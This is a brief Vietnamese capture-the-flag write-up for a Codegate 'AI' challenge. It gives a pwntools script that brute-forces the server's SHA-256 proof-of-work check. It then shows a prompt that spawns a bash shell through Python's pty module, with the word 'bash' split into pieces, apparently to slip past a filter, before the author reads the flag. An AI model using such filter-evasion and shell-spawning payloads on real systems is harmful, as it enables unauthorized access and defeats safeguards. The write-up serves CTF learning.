# Codegate / AI 
![image](https://github.com/anhshidou/nopsctf-2024/assets/81132394/fac98830-7cef-42ab-9805-8db3cce9ab31)

Trước tiên mình thử tải file về và kiểm tra source code của nó

![image](https://github.com/anhshidou/nopsctf-2024/assets/81132394/1bffb79e-dc98-464b-b9f6-0aaad9c961f7)

Tại đây mình có 1 script để bypass sanity check

```
import random 
import string 
import hashlib 
import itertools
import string
from pwn import *
re = remote('13.125.209.34', 5334)
reuslt = re.recvline().decode()
# context.log_level = 'debug'
def generate_strings(length, char_set):
    return [''.join(combo) for combo in itertools.product(char_set, repeat=length)]

char_set = string.ascii_letters + string.digits
length = 4  # Change this to the desired length

# strings = generate_strings(length, char_set)
salt_length = 16
difficulty = 4


def load_balancing():
    # rand_str = ''.join(random.sample(string.ascii_letters + string.digits, salt_length + difficulty))
    # salt = "".join(rand_str[:salt_length])
    # salt = input("enter salt: ")
    salt = reuslt[7:23]
    # correct_str = "".join(rand_str[salt_length:])
    # hash_str = hashlib.sha256(rand_str.encode()).hexdigest()
    # hash_str = input("enter hash_str: ")
    hash_str = reuslt[35:35+64]
    print (f"Result is {reuslt}\nSalt is {salt}\nhash_str is {hash_str}\n")
    strings = generate_strings(length, char_set)
    for rand_string in strings:
        if (hashlib.sha256((salt + rand_string).encode()).hexdigest()  == hash_str):
            print(f"Salt is {salt}\n rand_string is {rand_string}\n hash_str is {hash_str}\n")
            print(f"sha256({salt} + {'X' * difficulty}) == {hash_str}")
            re.sendlineafter(b"Give me X:", rand_string)
            re.interactive()
            re.recvall()
    re.close()
load_balancing()
```

Sau khi mình connect được vào, mình promt như sau
`import pty; a = “ba”+"s"+"h" ;pty.spawn(a)`

![image](https://github.com/anhshidou/nopsctf-2024/assets/81132394/abbab18c-d93a-457b-b51e-d0936903d542)

Còn lại ta `cat flag` là ra

**--END--**
